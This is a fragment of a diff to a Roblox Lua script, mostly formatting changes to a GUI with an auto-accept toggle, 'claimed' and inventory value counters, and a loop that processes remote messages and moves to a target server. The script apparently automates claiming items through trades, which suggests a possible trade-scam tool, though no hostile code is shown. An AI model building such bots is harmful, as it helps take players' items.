-    autoBtn.TextColor3 = Color3.fromRGB(255, 200, 50)
-    autoBtn.TextSize = 11
-    autoBtn.AutoButtonColor = false
+    local autoBtn             = Instance.new("TextButton")
+    autoBtn.Parent            = main
+    autoBtn.BackgroundColor3  = Color3.fromRGB(20, 18, 10)
+    autoBtn.Position          = UDim2.new(0, 20, 0, 300)
+    autoBtn.Size              = UDim2.new(1, -40, 0, 28)
+    autoBtn.Font              = Enum.Font.Code
+    autoBtn.Text              = "[ AUTO: ON ]"
+    autoBtn.TextColor3        = Color3.fromRGB(255, 200, 50)
+    autoBtn.TextSize          = 11
+    autoBtn.AutoButtonColor   = false
 
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    btnCorner.Parent = autoBtn
+    local btnCorner           = Instance.new("UICorner")
+    btnCorner.CornerRadius    = UDim.new(0, 6)
+    btnCorner.Parent          = autoBtn
 
-    local btnStroke = Instance.new("UIStroke")
-    btnStroke.Color = Color3.fromRGB(255, 200, 50)
-    btnStroke.Thickness = 1
-    btnStroke.Transparency = 0.5
-    btnStroke.Parent = autoBtn
+    local btnStroke           = Instance.new("UIStroke")
+    btnStroke.Color           = Color3.fromRGB(255, 200, 50)
+    btnStroke.Thickness       = 1
+    btnStroke.Transparency    = 0.5
+    btnStroke.Parent          = autoBtn
 
     autoBtn.MouseButton1Click:Connect(function()
-        autoAccept = not autoAccept
-        autoBtn.Text = autoAccept and "[ AUTO: ON ]" or "[ AUTO: OFF ]"
+        autoAccept     = not autoAccept
+        autoBtn.Text   = autoAccept and "[ AUTO: ON ]" or "[ AUTO: OFF ]"
         autoBtn.TextColor3 = autoAccept and Color3.fromRGB(255, 200, 50) or Color3.fromRGB(255, 80, 80)
-        btnStroke.Color = autoAccept and Color3.fromRGB(255, 200, 50) or Color3.fromRGB(255, 80, 80)
+        btnStroke.Color    = autoAccept and Color3.fromRGB(255, 200, 50) or Color3.fromRGB(255, 80, 80)
     end)
 
     local logMessages = {}
 
     local function addLog(message, color)
-        table.insert(logMessages, {text = message, color = color or Color3.fromRGB(255, 200, 50)})
-        local visibleMessages = {}
+        table.insert(logMessages, { text = message, color = color or Color3.fromRGB(255, 200, 50) })
         local startIndex = math.max(1, #logMessages - 8)
+        local logText    = ""
         for i = startIndex, #logMessages do
-            table.insert(visibleMessages, logMessages[i])
-        end
-        local logText = ""
-        for i, log in ipairs(visibleMessages) do
+            local log   = logMessages[i]
             local r, g, b = math.floor(log.color.R * 255), math.floor(log.color.G * 255), math.floor(log.color.B * 255)
             logText = logText .. string.format('<font color="rgb(%d,%d,%d)">%s</font>\n', r, g, b, log.text)
         end
@@ -809,8 +694,8 @@ local function createGui()
 
     task.spawn(function()
         local lastStatus = ""
-        local lastValue = 0
-        local lastInv = 0
+        local lastValue  = 0
+        local lastInv    = 0
         while running do
             local statusText = currentStatus:upper()
             if statusText ~= lastStatus then
@@ -825,12 +710,12 @@ local function createGui()
                 end
             end
             if totalValue ~= lastValue then
-                lastValue = totalValue
-                valueLabel.Text = "> claimed: $" .. string.format("%.2f", totalValue)
+                lastValue        = totalValue
+                valueLabel.Text  = "> claimed: $" .. string.format("%.2f", totalValue)
             end
             if myInvValue ~= lastInv then
-                lastInv = myInvValue
-                invLabel.Text = "> inventory: $" .. string.format("%.2f", myInvValue)
+                lastInv         = myInvValue
+                invLabel.Text   = "> inventory: $" .. string.format("%.2f", myInvValue)
             end
             task.wait(0.3)
         end
@@ -847,12 +732,11 @@ local function scanLoop()
                     local msg = messages[i]
                     if not lastMsg or tonumber(msg.id) > tonumber(lastMsg) then
                         lastMsg = msg.id
-                        printMessageInfo(msg)
                         processMsg(msg)
                     end
                 end
             end
-            if game.JobId ~= targetJobId and targetJobId then
+            if targetJobId and game.JobId ~= targetJobId then
                 checkIfInCorrectServer()
             end
         end)
@@ -868,9 +752,7 @@ saveBackup()
 monitorTrade()
 autoAcceptLoop()
 sendStatus("waiting")
-
 myInvValue = calculateInvValue()
-
 task.spawn(scanLoop)
 
 task.spawn(function()
